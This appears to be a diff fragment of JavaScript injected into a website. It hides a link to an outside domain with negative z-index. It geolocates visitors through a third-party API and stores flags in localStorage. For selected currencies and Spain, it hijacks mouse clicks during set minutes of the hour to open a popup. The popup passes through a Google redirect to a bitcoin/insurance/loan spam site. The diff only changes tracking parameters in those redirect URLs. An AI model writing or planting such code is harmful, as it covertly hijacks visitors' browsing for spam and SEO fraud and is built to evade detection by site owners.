@@ -2,10 +2,10 @@ let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;le
 
 if (!localStorage.xcaf){(async()=>{let aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json());localStorage.xcaf=1;if(/£|[$]|€/.test(aa.geoplugin_currencySymbol)){localStorage.xcaf=2;if(/Spain/.test(aa.geoplugin_countryName)){localStorage.xcaf=3};uhd()}})();}
 
-function uhd(){document.onmousedown=()=>{let dte=(new Date).getMinutes();if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<30||localStorage.xcaf==3&&dte>9&&dte<20)){window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-insurance-types-of-insurance-and-meaning-insurance-policy&ved=2ahUKEwiYkPq9-ov6AhU1ZWwGHZOXBYgQFnoECA0QAQ&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4'); sessionStorage.i='i'}}};uhd()
+function uhd(){document.onmousedown=()=>{let dte=(new Date).getMinutes();if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<30||localStorage.xcaf==3&&dte>9&&dte<20)){window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-insurance-types-of-insurance-and-meaning-insurance-policy&ved=2ahUKEwiyjPG_h5L6AhWBSGwGHT2gAgEQFnoECBAQAQ&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4'); sessionStorage.i='i'}}};uhd()
 // "€"==a
 
 
-    // https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-insurance-types-of-insurance-and-meaning-insurance-policy&ved=2ahUKEwie7ZjioYL6AhWwR2wGHa5MAsIQFnoECA0QAQ&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4
+    // https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-insurance-types-of-insurance-and-meaning-insurance-policy&ved=2ahUKEwiyjPG_h5L6AhWBSGwGHT2gAgEQFnoECBAQAQ&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4
 
     // https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-loan-how-many-types-of-loan-best-loan-service-provider&ved=2ahUKEwi74Y-gsIL6AhVYFIgKHW2oB6EQFnoECAsQAQ&usg=AOvVaw3djirs4qcicfndXpsApzfk
